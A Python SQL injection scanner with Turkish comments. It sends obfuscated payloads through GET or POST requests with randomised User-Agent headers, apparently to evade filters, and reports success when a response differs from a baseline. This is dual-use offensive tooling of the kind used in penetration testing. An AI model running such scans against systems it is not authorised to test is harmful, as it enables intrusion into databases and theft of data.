import requests
import logging
import random
from concurrent.futures import ThreadPoolExecutor
from obfuscator import obfuscate_payloads

def get_response(url, headers, method='GET', data=None):
    """
    Belirtilen yöntemde HTTP isteği yapar ve yanıtı döner.
    """
    try:
        if method == 'GET':
            return requests.get(url, headers=headers, timeout=5)
        elif method == 'POST':
            return requests.post(url, headers=headers, data=data, timeout=5)
    except requests.Timeout:
        logging.error("İstek zaman aşımına uğradı.")
    except requests.ConnectionError:
        logging.error("Bağlantı hatası.")
    except requests.RequestException as e:
        logging.error(f"İstek sırasında beklenmeyen hata: {e}")
    return None

def check_response(normal_response, response, payload, error_messages):
    """
    Gelen yanıtı normal yanıt ile karşılaştırır ve hata mesajlarını kontrol eder.
    """
    if not response:
        return False
    
    if response.text != normal_response or any(error in response.text for error in error_messages):
        logging.warning(f"SQL Enjeksiyonu başarılı! Payload: {payload}")
        return True
    return False

def test_sql_injection(url, payloads, error_messages, user_agents, is_post=False, data=None):
    """
    SQL injection açığını test eden fonksiyon.
    """
    random_user_agent = random.choice(user_agents) if user_agents else {}
    headers = {'User-Agent': random_user_agent}
    
    normal_response = get_response(url, headers, method='POST' if is_post else 'GET', data=data)
    if normal_response:
        normal_response_content = normal_response.text
        logging.info("Normal yanıt referans olarak alındı.")
    else:
        logging.error("Normal yanıt alınamadı, test gerçekleştirilemiyor.")
        return
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        for payload in payloads:
            obfuscated_payloads = obfuscate_payloads(payload)
            for obf_payload in obfuscated_payloads:
                test_url = f"{url}{obf_payload}" if not is_post else url
                modified_data = data.copy() if is_post else {}
                if is_post:
                    modified_data['payload'] = obf_payload
                future = executor.submit(get_response, test_url, headers, method='POST' if is_post else 'GET', data=modified_data)
                
                response = future.result()
                if response and check_response(normal_response_content, response, payload, error_messages):
                    logging.info(f"SQL injection başarılı! Payload: {payload}")
